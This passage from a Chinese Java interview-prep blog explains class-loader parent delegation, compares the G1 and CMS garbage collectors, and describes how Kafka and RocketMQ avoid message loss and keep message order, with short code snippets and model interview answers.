<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NDJjODJiOTE5MWE3OTExMzQ4ZjJiYWIxODNlZjQ3MjJfanE3Wk5wUVNHajVKaG1SV0wwUEdaSmk0MHhSeWdGNHZfVG9rZW46RE5iZGJ6N1dSb1doenZ4OUhsc2NOb21wbmNnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="双亲委派机制">双亲委派机制</h2>
<blockquote>
<p>Java 使用三层类加载器体系：BootstrapClassLoader 加载 JVM 核心类；ExtensionClassLoader 加载扩展类库；ApplicationClassLoader 加载 classpath 下的用户代码。它们形成双亲委派结构，保证类加载的安全性与一致性。开发中也可以通过继承 ClassLoader 实现自定义加载器，用于热加载、模块隔离等高级功能。</p>
</blockquote>
<h2 id="🔁-正确的加载顺序（从子发起-→-父尝试加载-→-子再自己加载）">🔁 正确的加载顺序（从子发起 → 父尝试加载 → 子再自己加载）</h2>
<p>以加载某个类 <code>com.example.Foo</code> 为例：</p>
<ol>
<li>应用类加载器（AppClassLoader）收到加载请求。</li>
<li>AppClassLoader → 把请求委托给其父加载器 ExtensionClassLoader。</li>
<li>ExtensionClassLoader → 把请求继续委托给 BootstrapClassLoader。</li>
<li>BootstrapClassLoader 尝试加载类：
<ol>
<li>如果能加载（比如是 <code>java.lang.String</code>），就直接加载，流程结束。</li>
<li>如果不能加载（比如是我们业务类），它就返回“加载失败”。</li>
</ol>
</li>
<li>扩展类加载器尝试加载 → 失败。</li>
<li>应用类加载器最终<strong>自己尝试加载</strong> → 找到了 class 文件 → 加载成功。</li>
</ol>
<p>双亲委派机制（<strong>Parent Delegation Model</strong>）是 Java 类加载器的一种 <strong>类加载模型</strong>，用于保证类的安全性和一致性。</p>
<h2 id="🧠-一、什么是双亲委派机制？">🧠 一、什么是双亲委派机制？</h2>
<p>类加载器按层级结构组织，加载类时遵循：</p>
<blockquote>
<p><strong>先向父加载器请求加载，父加载器无法加载时，才由自己加载。</strong></p>
</blockquote>
<p>顺序如下（假设你自定义了一个类加载器）：</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ApplicationClassLoader（应用类加载器）` `       ↑ ``ExtensionClassLoader（扩展类加载器） ``       ↑ ``BootstrapClassLoader（启动类加载器）</span><br></pre></td></tr></table></figure>
<p>你调用 <code>MyClassLoader.loadClass(&quot;java.lang.String&quot;)</code>：</p>
<ol>
<li>→ 先让父类加载器加载（从上往下找）</li>
<li>→ 父类找不到，才轮到自己加载（当前类加载器）</li>
</ol>
<h2 id="📦-二、为什么使用双亲委派？">📦 二、为什么使用双亲委派？</h2>
<h3 id="✅-防止重复加载">✅ 防止重复加载</h3>
<ul>
<li>保证每个类只由一个类加载器加载，防止“一个类被多个类加载器加载，产生多个类对象”的问题。</li>
</ul>
<h3 id="✅-保证核心类安全">✅ 保证核心类安全</h3>
<ul>
<li>比如你定义了一个假的 <code>java.lang.String</code> 类，如果没有双亲委派，系统可能会加载你写的类，<strong>这将危及整个 JVM 的安全性！</strong></li>
</ul>
<h2 id="🔍-三、举个例子说明加载流程">🔍 三、举个例子说明加载流程</h2>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> static void main(<span class="title class_">String</span>[] args) throws <span class="title class_">ClassNotFoundException</span> &#123;</span><br><span class="line">        <span class="title class_">ClassLoader</span> loader = <span class="title class_">Test</span>.<span class="keyword">class</span>.getClassLoader(); <span class="regexp">//</span> <span class="title class_">AppClassLoader</span><span class="string">` `</span>        <span class="title class_">Class</span>&lt;<span class="string">?&gt;</span> clazz = loader.loadClass(<span class="string">&quot;java.lang.String&quot;</span>); <span class="string">``</span>        <span class="title class_">System</span>.out.println(clazz.getClassLoader()); <span class="regexp">//</span> 输出 null（由 <span class="title class_">Bootstrap</span> 加载）<span class="string">` `</span>    &#125; <span class="string">``</span>&#125;</span><br></pre></td></tr></table></figure>
<p>解释：</p>
<ul>
<li><code>Test</code> 由 AppClassLoader 加载</li>
<li>你调用它去加载 <code>java.lang.String</code></li>
<li>它发现自己有父亲（ExtClassLoader），继续往上问</li>
<li>最后 BootstrapClassLoader 找到了 <code>String</code>，加载成功</li>
<li>所以输出：<code>null</code>（代表 BootstrapClassLoader）</li>
</ul>
<h2 id="🔄-四、何时打破双亲委派机制？">🔄 四、何时打破双亲委派机制？</h2>
<p>有些框架会<strong>打破双亲委派</strong>，比如：</p>
<h3 id="1、Servlet-容器（Tomcat）">1、Servlet 容器（Tomcat）</h3>
<ul>
<li>Web 应用中的类由 WebAppClassLoader 加载</li>
<li>它需要优先加载自己的类，而不是父加载器（因为有版本隔离需求）</li>
<li>所以 Tomcat 实现了自己的类加载逻辑，打破双亲委派</li>
</ul>
<h3 id="2、SPI-机制（服务提供者接口）">2、SPI 机制（服务提供者接口）</h3>
<ul>
<li>通过 <code>META-INF/services</code> 加载扩展</li>
<li>需要让子类加载器加载类（否则扩展无法注入）</li>
</ul>
<h2 id="🎯-六、面试话术总结">🎯 六、面试话术总结</h2>
<blockquote>
<p>Java 类加载器采用双亲委派机制，确保类的唯一性与安全性。加载请求从下往上逐级委托，优先由父加载器处理。如果父类无法加载，才由当前类加载器尝试加载。这一机制可防止核心类被篡改，避免类冲突。像 Tomcat、SPI 等因扩展性或隔离需求，会打破双亲委派，自己实现类加载流程。</p>
</blockquote>
<h2 id="g1垃圾回收器和cms垃圾回收器对比">g1垃圾回收器和cms垃圾回收器对比</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjM5MzJkMjRjYWJlMWZjODAyMjY1MDhiZWEzMjEyOWZfSzVvYVhqTGVoaENkN2ZyZ1ljbHpIMGtzeTRQZ1Z2OTdfVG9rZW46RnByQ2JDcDE0bzhFS3R4SWNsb2Ntd1VzbmliXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="🔍-二、详细对比分析">🔍 二、详细对比分析</h2>
<h3 id="1、回收策略对比">1、回收策略对比</h3>
<h4 id="🌱-CMS：分代-标记清除">🌱 CMS：分代 + 标记清除</h4>
<ul>
<li>新生代：复制算法（Minor GC）</li>
<li>老年代：标记-清除（Mark-Sweep）算法</li>
<li>步骤：
<ul>
<li>初始标记（STW）</li>
<li>并发标记（不 STW）</li>
<li>重新标记（STW）</li>
<li>并发清除</li>
</ul>
</li>
</ul>
<p>📌 <strong>缺点</strong>：清除不整理，导致<strong>内存碎片</strong>。</p>
<h4 id="🌲-G1：统一-Region-标记复制-整理">🌲 G1：统一 Region + 标记复制 + 整理</h4>
<ul>
<li>把堆划成大小相等的 Region，每个 Region 可能是 Eden、Survivor 或 Old。</li>
<li>回收时按 Region 的垃圾率来优先回收，避免碎片。</li>
<li>使用<strong>复制 + 整理</strong>，Full GC 也做内存整理。</li>
</ul>
<p>📌 <strong>优点</strong>：<strong>避免内存碎片</strong>，支持<strong>可预测的停顿时间（pause time goal）</strong>。</p>
<h3 id="2、GC-过程对比">2、GC 过程对比</h3>
<h4 id="CMS-回收流程图（老年代）：">CMS 回收流程图（老年代）：</h4>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I<span class="function"><span class="title">nitial</span> Mark -&gt;</span> C<span class="function"><span class="title">oncurrent</span> Mark -&gt;</span> R<span class="function"><span class="title">emark</span> -&gt;</span> Concurrent Sweep</span><br></pre></td></tr></table></figure>
<blockquote>
<p>其中 Initial Mark 和 Remark 是 STW，其余并发。</p>
</blockquote>
<h4 id="G1-回收流程图：">G1 回收流程图：</h4>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Young GC（新生代）： <span class="string">``</span>  复制式回收（Eden → Survivor） <span class="string">``</span>Mixed GC（新+旧）： <span class="string">``</span>  复制新生代 + 回收部分垃圾比例高的 Old Region + 内存整理</span><br></pre></td></tr></table></figure>
<h3 id="3、举例说明：大对象回收与碎片问题">3、举例说明：大对象回收与碎片问题</h3>
<h4 id="CMS：">CMS：</h4>
<ul>
<li>某线程申请一个 800MB 大对象，老年代碎片化为 1GB 空间但不连续，会导致 <strong>分配失败 → Full GC → OOM</strong>。</li>
</ul>
<h4 id="G1：">G1：</h4>
<ul>
<li>G1 会自动整理内存，把小块 Region 合并成连续内存，不容易碎片化，<strong>不会出现上面的问题</strong>。</li>
</ul>
<h2 id="🧪-三、面试回答话术总结">🧪 三、面试回答话术总结</h2>
<h3 id="面试官问：CMS-与-G1-有什么区别？">面试官问：CMS 与 G1 有什么区别？</h3>
<blockquote>
<p>CMS 是基于分代设计的垃圾回收器，新生代采用复制算法，老年代采用标记-清除，能并发回收老年代但容易产生内存碎片；而 G1 是基于 Region 的设计，把堆划分成多个小块，采用标记-复制+内存整理，能避免碎片并根据对象回收率优先回收，有 pause time 的预测机制，更适合大内存场景，是 CMS 的替代者。</p>
</blockquote>
<h3 id="面试官问：G1-为什么能避免内存碎片？">面试官问：G1 为什么能避免内存碎片？</h3>
<blockquote>
<p>G1 在回收过程中采用复制整理算法，会将多个 Region 中存活对象压缩复制到连续内存区域，不像 CMS 那样只是清除而不整理，所以可以有效避免老年代内存碎片的问题。</p>
</blockquote>
<h3 id="面试官问：G1-与-CMS-的回收流程有什么不同？">面试官问：G1 与 CMS 的回收流程有什么不同？</h3>
<blockquote>
<p>CMS 老年代是并发标记、清除，部分 STW，容易产生碎片。G1 把整个堆分成多个 Region，不区分代时严格分代，新老代都可以并发回收，尤其是 Mixed GC 结合了新生代与部分老年代 Region 的回收，而且 G1 会在回收后整理内存、移动对象，最终减少碎片并提升大对象分配成功率。</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWM1YTJlNDlhMGUwYTAxYWEyYzJkZGRhYjljMDFlYjRfb2pMRjFnTXVUcFFQcUd2ZFk5RFg1V1FKRjJ5aUcwamJfVG9rZW46TUZ4S2JhOEFlb3lDTTJ4MlZydWN2dEpQbnBkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=N2I3NThhYTJhNDM5OTEyMDVmN2FmOTIzOWM3YTdmNzhfd0JWSzM2Q2JqcVVYWkQ0dmtJTzlTaUt0eVlhaEVaNjZfVG9rZW46WURjTGJYTFBlbzk1TTF4enJ4V2M1YUNmbkNlXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MDY4ZDBhMzMxNzZhYmRjY2UyYTAzYWQxNzc2MzAxZDFfTEZFUkNHNXdDSW1uVWhQQmFhTFFOTzRRU2hDU1F6cFdfVG9rZW46SFQ5QWJtN0l2bzRsa1d4bXRRSWN5N0VnbjViXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>G1就是识别几个垃圾比例比较大的Region，然后将还有用的对象复制到一个空的Region，再将这几个垃圾比例大的Region给清空，从而避免了碎片问题</p>
<h2 id="mq如何保证数据不丢失">mq如何保证数据不丢失</h2>
<h2 id="✅-一、MQ-保证消息不丢失的完整流程">✅ 一、MQ 保证消息不丢失的完整流程</h2>
<p>消息从生产 → 存储 → 投递到消费者，中间任何一个环节都可能发生消息丢失，所以我们从<strong>三段式流程</strong>逐一讲解如何防止丢失：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[1]</span> 生产端 —— <span class="selector-attr">[2]</span> MQ服务端 —— <span class="selector-attr">[3]</span> 消费端</span><br></pre></td></tr></table></figure>
<h2 id="🚩-1-生产端：如何保证“消息成功发送到-Broker”？">🚩 1. 生产端：如何保证“消息成功发送到 Broker”？</h2>
<h3 id="🔒-机制：消息确认机制（ACK）">🔒 机制：<strong>消息确认机制（ACK）</strong></h3>
<h4 id="Kafka：">Kafka：</h4>
<ul>
<li><code>acks=0</code>：生产者不等 Broker 响应，<strong>最快但最容易丢</strong></li>
<li><code>acks=1</code>：Leader Partition 写入成功即返回，Follower 失败会丢</li>
<li><code>acks=all</code>：Leader 和所有 Follower 写入成功才返回，<strong>最安全</strong></li>
</ul>
<h4 id="RocketMQ：">RocketMQ：</h4>
<ul>
<li>默认同步刷盘（sync flush）：Broker 确认落盘后才返回 OK</li>
<li>支持异步刷盘和同步刷盘两种策略</li>
</ul>
<h3 id="✅-面试话术：">✅ 面试话术：</h3>
<blockquote>
<p>“在生产端，Kafka 通过设置 acks 参数控制数据持久性级别，其中 <code>acks=all</code> 搭配同步发送是最可靠的，能确保消息写入所有副本。RocketMQ 也支持同步刷盘模式，确保数据落盘才返回 ACK，从而避免生产阶段消息丢失。”</p>
</blockquote>
<h2 id="🚩-2-Broker-存储端：如何保证“消息持久化不丢”？">🚩 2. Broker 存储端：如何保证“消息持久化不丢”？</h2>
<h3 id="🔒-核心机制一：写入磁盘（持久化）">🔒 核心机制一：<strong>写入磁盘（持久化）</strong></h3>
<ul>
<li>Kafka：使用 <strong>PageCache + 磁盘日志文件（.log）</strong></li>
<li>RocketMQ：消息先写入内存映射文件（MappedFile），再刷盘到磁盘</li>
</ul>
<h3 id="🔁-核心机制二：WAL（Write-Ahead-Logging）日志机制">🔁 核心机制二：<strong>WAL（Write-Ahead Logging）日志机制</strong></h3>
<ul>
<li>所有消息先写 WAL 日志，再刷盘（日志优先写入）</li>
<li>如果宕机，系统重启后可从 WAL 恢复数据</li>
</ul>
<h3 id="✅-RocketMQ-示例：">✅ RocketMQ 示例：</h3>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SendResult <span class="built_in">result</span> = producer.<span class="built_in">send</span>(message);` `<span class="keyword">if</span> (<span class="built_in">result</span>.getSendStatus() == SendStatus.SEND_OK) <span class="comment">&#123;// 消息已刷盘成功` `&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="🚩-3-消费端：如何保证“消息被消费不会丢”？">🚩 3. 消费端：如何保证“消息被消费不会丢”？</h2>
<h3 id="✅-RocketMQ-消费语义：">✅ RocketMQ 消费语义：</h3>
<h3 id="✅-Kafka-消费语义：">✅ Kafka 消费语义：</h3>
<ul>
<li><strong>at most once（最多一次）</strong>：消费完就提交 → 可能丢（未处理前提交）</li>
<li><strong>at least once（至少一次）</strong>：处理后再提交 → 可能重复</li>
<li><strong>exactly once</strong>：开启幂等处理 + 事务 → 精确一次（代价较高）</li>
</ul>
<h2 id="🧠-重要扩展：宕机场景如何防丢">🧠 重要扩展：<strong>宕机场景如何防丢</strong></h2>
<h3 id="场景-1：Broker-宕机">场景 1：Broker 宕机</h3>
<ul>
<li>Kafka → 有多个副本，follower 自动选举 leader，继续服务</li>
<li>RocketMQ → Master 宕机，Slave 不可写但可读，可配置自动切主（Dledger 模式）</li>
</ul>
<h3 id="场景-2：消费者宕机">场景 2：消费者宕机</h3>
<ul>
<li>Kafka → 消费者组中的其他消费者自动接管分区</li>
<li>RocketMQ → Broker 会把消息重新投递（失败后进入重试 Topic）</li>
</ul>
<h2 id="✅-四、完整例子（Kafka）">✅ 四、完整例子（Kafka）</h2>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Properties props = <span class="keyword">new</span> Properties<span class="function"><span class="params">()</span>; ``<span class="title">props</span>.<span class="title">put</span><span class="params">(<span class="string">&quot;acks&quot;</span>, <span class="string">&quot;all&quot;</span>)</span>; // 保证写入全部副本` `<span class="title">props</span>.<span class="title">put</span><span class="params">(<span class="string">&quot;retries&quot;</span>, <span class="number">3</span>)</span>;  // 重试` `<span class="title">props</span>.<span class="title">put</span><span class="params">(<span class="string">&quot;enable.idempotence&quot;</span>, <span class="literal">true</span>)</span>; // 幂等性` `<span class="title">props</span>.<span class="title">put</span><span class="params">(<span class="string">&quot;delivery.timeout.ms&quot;</span>, <span class="number">30000</span>)</span>; ``<span class="title">KafkaProducer</span>&lt;<span class="title">String</span>, <span class="title">String</span>&gt; <span class="title">producer</span> = <span class="title">new</span> <span class="title">KafkaProducer</span>&lt;&gt;<span class="params">(props)</span>; ``<span class="title">ProducerRecord</span>&lt;<span class="title">String</span>, <span class="title">String</span>&gt; <span class="title">record</span> = <span class="title">new</span> <span class="title">ProducerRecord</span>&lt;&gt;<span class="params">(<span class="string">&quot;order-topic&quot;</span>, <span class="string">&quot;order123&quot;</span>, <span class="string">&quot;create&quot;</span>)</span>; ``<span class="title">producer</span>.<span class="title">send</span><span class="params">(record, (metadata, exception) -&gt; &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">if</span> (exception != <span class="literal">null</span>) &#123; ``<span class="language-javascript">        log.<span class="title function_">error</span>(<span class="string">&quot;Send failed&quot;</span>, exception); <span class="comment">// 可回滚或补偿` `    &#125; else &#123; </span></span>``        ``<span class="language-javascript">log.<span class="property">info</span></span>``(<span class="string">&quot;Send success, offset=&#123;&#125;&quot;</span>, metadata.offset()); ``<span class="language-javascript">    &#125; </span>``&#125;)</span>;</span></span><br></pre></td></tr></table></figure>
<h2 id="✅-五、面试高频话术总结">✅ 五、面试高频话术总结</h2>
<blockquote>
<p>“MQ 在生产、存储、消费三个阶段分别使用 ACK 机制、刷盘机制、消费确认机制来防止消息丢失。例如在 Kafka 中通过设置 <code>acks=all</code> 确保消息写入所有副本、开启幂等性避免重复发送。RocketMQ 也提供同步刷盘和重试队列等方式保障可靠性。此外在 Broker 或消费者宕机时，还可通过副本和消费重试机制继续保障消息不丢。”</p>
</blockquote>
<h2 id="✅-1-MQ-如何保证数据不丢失？">✅ 1. MQ 如何保证数据不丢失？</h2>
<h3 id="Kafka：-2">Kafka：</h3>
<ul>
<li><strong>写入端：</strong>
<ul>
<li>开启 <code>acks=all</code>，表示 leader 和 ISR 副本都写入成功才确认；</li>
<li>开启 <code>replication.factor &gt;= 2</code>，防止节点宕机数据丢失；</li>
<li>Broker 开启 <code>flush</code> 和 <code>fsync</code> 配置，确保写入磁盘。</li>
</ul>
</li>
<li><strong>消费端：</strong>
<ul>
<li>消费后手动提交 offset，确保处理完成才标记消费成功；</li>
<li>配合幂等性消费逻辑实现“消费至少一次”。</li>
</ul>
</li>
</ul>
<h3 id="RocketMQ：-2">RocketMQ：</h3>
<ul>
<li><strong>写入端：</strong>
<ul>
<li>同步刷盘（SYNC_FLUSH）：Broker 写入磁盘成功再返回；</li>
<li>主从同步复制：同步双写模式，主写入后同步到从节点；</li>
<li>磁盘持久化：CommitLog 采用顺序写 + mmap 映射，可靠性高。</li>
</ul>
</li>
<li><strong>消费端：</strong>
<ul>
<li>消息消费成功后手动 ACK，否则重试（支持重试队列）；</li>
<li>消息状态保存在 Broker 或 Consumer 本地。</li>
</ul>
</li>
</ul>
<p>🧠 <strong>总结话术：</strong></p>
<blockquote>
<p>“MQ 保证不丢失关键在于写入可靠性（同步刷盘+副本复制）和消费确认机制（ACK + 重试 + 幂等处理）。”</p>
</blockquote>
<h2 id="详细版：">详细版：</h2>
<h2 id="✅-一、Kafka-如何保证消息不丢失">✅ 一、Kafka 如何保证消息不丢失</h2>
<h3 id="✅-1-写入端防止丢失的配置">✅ 1. 写入端防止丢失的配置</h3>
<h4 id="【acks-all】"><strong>【acks = all】</strong></h4>
<ul>
<li>表示 Leader Partition 收到消息后，要等待所有 ISR 副本都成功写入后再响应客户端。</li>
<li><strong>acks = all + replication.factor ≥ 2 +</strong> <strong>min.insync.replicas ≥ 2</strong> → 即使某个副本宕机也不会丢数据。</li>
</ul>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">props</span>.<span class="built_in">put</span>(<span class="string">&quot;acks&quot;</span>, <span class="string">&quot;all&quot;</span>); // Leader 和 ISR 全部确认才返回` `<span class="built_in">props</span>.<span class="built_in">put</span>(<span class="string">&quot;retries&quot;</span>, <span class="number">3</span>);  // 失败自动重试` `<span class="built_in">props</span>.<span class="built_in">put</span>(<span class="string">&quot;enable.idempotence&quot;</span>, <span class="literal">true</span>); // 保证幂等性（避免重复写）</span><br></pre></td></tr></table></figure>
<h4 id="✅-示例">✅ 示例</h4>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ProducerRecord&lt;<span class="built_in">String</span>, <span class="built_in">String</span>&gt; record = <span class="literal">new</span> ProducerRecord&lt;&gt;(<span class="string">&quot;orders&quot;</span>, <span class="string">&quot;order_1&quot;</span>, <span class="string">&quot;create&quot;</span>); <span class="string">``</span>producer.send(record, (metadata, exception) -&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (exception != <span class="built_in">null</span>) &#123; <span class="string">``</span>        <span class="keyword">log</span>.error(<span class="string">&quot;消息发送失败&quot;</span>, exception); <span class="string">``</span>    &#125; <span class="keyword">else</span> &#123; <span class="string">``</span>        <span class="string">``</span><span class="keyword">log</span>.info<span class="string">``</span>(<span class="string">&quot;消息发送成功，offset=&#123;&#125;&quot;</span>, metadata.offset()); <span class="string">``</span>    &#125; <span class="string">``</span>&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="✅-2-Broker-存储层持久化机制">✅ 2. Broker 存储层持久化机制</h3>
<h4 id="🔹-PageCache-顺序写入磁盘">🔹 PageCache + 顺序写入磁盘</h4>
<ul>
<li>Kafka 写入 PageCache，再异步刷盘；可以通过 <code>flush.messages</code>、<code>flush.ms</code> 配置控制落盘频率。</li>
<li>可开启 <code>log.flush.interval.messages=1</code> 强制每条消息都 flush（性能低但高可靠）。</li>
</ul>
<h4 id="🔹-WAL（预写日志）机制">🔹 WAL（预写日志）机制</h4>
<ul>
<li>所有消息都写入 <code>.log</code> 文件（类似 Binlog），即使宕机也能通过日志恢复。</li>
</ul>
<h3 id="✅-3-消费端防丢策略">✅ 3. 消费端防丢策略</h3>
<h4 id="【手动提交-offset】">【手动提交 offset】</h4>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">consumer<span class="selector-class">.commitSync</span>(); <span class="comment">// 消费完成后再提交 offset</span></span><br></pre></td></tr></table></figure>
<ul>
<li>如果消费失败但已提交 offset → 消息丢失（at-most-once）</li>
<li>如果先处理再提交 offset → 消息重复但不丢失（at-least-once）</li>
</ul>
<h4 id="【幂等消费逻辑】">【幂等消费逻辑】</h4>
<ul>
<li>以订单系统为例，可根据唯一业务 ID（如 orderId）幂等地处理消费：</li>
</ul>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!orderService.<span class="keyword">exists</span>(orderId)) &#123; <span class="string">``</span>    orderService.createOrder(orderId); <span class="string">``</span>&#125;</span><br></pre></td></tr></table></figure>
<h2 id="✅-二、RocketMQ-如何保证消息不丢失">✅ 二、RocketMQ 如何保证消息不丢失</h2>
<h3 id="✅-1-写入端防丢机制">✅ 1. 写入端防丢机制</h3>
<h4 id="【同步刷盘-SYNC-FLUSH】">【同步刷盘 SYNC_FLUSH】</h4>
<ul>
<li><code>Broker</code> 将消息同步写入磁盘，再返回成功响应。</li>
</ul>
<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">message</span>.putUserProperty(MessageConst.PROPERTY_WAIT_STORE_MSG_OK, <span class="string">&quot;true&quot;</span>);</span><br></pre></td></tr></table></figure>
<h4 id="【主从同步复制-SYNC-MASTER】">【主从同步复制 SYNC_MASTER】</h4>
<ul>
<li><strong>同步双写模式</strong>：主写入成功后同步到从，确保高可靠。</li>
<li>宕机后可以切换到从节点恢复。</li>
</ul>
<h4 id="【CommitLog-mmap-顺序写】">【CommitLog + mmap + 顺序写】</h4>
<ul>
<li>使用<strong>顺序写磁盘</strong> + <strong>内存映射文件（MappedFile）</strong> 提高 IO 效率，同时写入可靠。</li>
</ul>
<h3 id="✅-2-消费端防丢策略">✅ 2. 消费端防丢策略</h3>
<h4 id="【手动-ACK-重试】">【手动 ACK + 重试】</h4>
<ul>
<li>消费失败时不返回 ACK，会被重新投递。</li>
<li>默认重试次数为 16 次，之后可转入死信队列（DLQ）。</li>
</ul>
<h4 id="【重试队列机制】">【重试队列机制】</h4>
<ul>
<li>每次失败重试会进入 <code>RETRY_TOPIC_%ConsumerGroup</code>，带有延迟投递时间。</li>
</ul>
<h3 id="✅-3-消息轨迹持久化（Trace）">✅ 3. 消息轨迹持久化（Trace）</h3>
<ul>
<li>RocketMQ 可以开启消息轨迹，记录消息发送时间、消费状态，便于定位是否丢失。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NWZhZmY4ZmJkNzRkNjYxYWMxMTI1ZGU3ZTY5NTU3NmFfTU85ME81ajNrQnc2N2JlVEV3bElpeGViSkpZM1JYd1FfVG9rZW46R0gxc2J1d1Zjb3lrd1R4MDFzZGNwOVJvbnRkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="mq如何保证消息的顺序性消费">mq如何保证消息的顺序性消费</h2>
<h2 id="✅-一、Kafka-如何保证消息顺序性消费">✅ 一、Kafka 如何保证消息顺序性消费</h2>
<h3 id="🎯-核心原理：">🎯 核心原理：</h3>
<ol>
<li>Kafka 中每个 <strong>Partition（分区）内部消息是有序的</strong>；</li>
<li>同一个 Partition 只能被一个 Consumer 实例消费；</li>
<li>如果我们<strong>将同一业务 Key 的消息都发送到同一个 Partition</strong>，就能保证它们消费的顺序。</li>
</ol>
<h3 id="🧪-示例：订单状态变更消息顺序消费">🧪 示例：订单状态变更消息顺序消费</h3>
<p><strong>业务场景：</strong> 电商系统中，每个订单依次会经历 “已下单 → 已支付 → 已发货 → 已签收”，我们希望这些状态变更的消息在消费时保持顺序。</p>
<h3 id="👇-Producer-代码（指定-key）">👇 Producer 代码（指定 key）</h3>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ProducerRecord&lt;String, String&gt; record = <span class="keyword">new</span> ProducerRecord&lt;&gt;(</span><br><span class="line">    <span class="string">&quot;order-status-topic&quot;</span>,   // Topic` `    orderId,                // key：保证相同订单进同一个 partition ``    <span class="string">&quot;订单状态变更：&quot;</span> + status  // value` `)<span class="comment">; ``producer.send(record);</span></span><br></pre></td></tr></table></figure>
<ul>
<li>Kafka 会根据 <code>key</code> 进行 hash 分区：同一个 <code>orderId</code> → 相同 Partition；</li>
<li>Partition 内天然有序；</li>
<li>每个 Partition 只有一个 Consumer 消费 ➜ 顺序可控。</li>
</ul>
<h3 id="📌-注意：-2">📌 注意：</h3>
<ul>
<li>Kafka 中是<strong>局部有序</strong>（即每个 Partition 内有序，跨 Partition 无法保证顺序）；</li>
<li>若并发发多个 Partition，就不能全局有序；</li>
<li>所以：<strong>同一类顺序性业务需要有规律地落在固定 Partition 上</strong>。</li>
</ul>
<h3 id="✅-Kafka-面试答题话术：">✅ Kafka 面试答题话术：</h3>
<blockquote>
<p>Kafka 通过将具有顺序关系的消息（如同一个订单）发送到同一个 Partition，实现局部有序性。每个 Partition 由单个消费者串行消费，确保同一 Partition 内消息顺序不乱。</p>
</blockquote>
<h2 id="✅-二、RocketMQ-如何保证消息顺序性消费">✅ 二、RocketMQ 如何保证消息顺序性消费</h2>
<h3 id="🎯-核心原理：-2">🎯 核心原理：</h3>
<ol>
<li>生产端：使用**顺序消息（OrderedMessage）**机制，将同一类型的消息路由到同一个队列（MessageQueue）；</li>
<li>消费端：使用 <code>MessageListenerOrderly</code>，<strong>单线程、串行消费队列内的消息</strong>，确保消费顺序。</li>
</ol>
<h3 id="🧪-示例：订单状态消息顺序发送-顺序消费">🧪 示例：订单状态消息顺序发送 &amp; 顺序消费</h3>
<h4 id="👇-Producer-顺序发送示例（将同一订单路由到同一个队列）">👇 Producer 顺序发送示例（将同一订单路由到同一个队列）</h4>
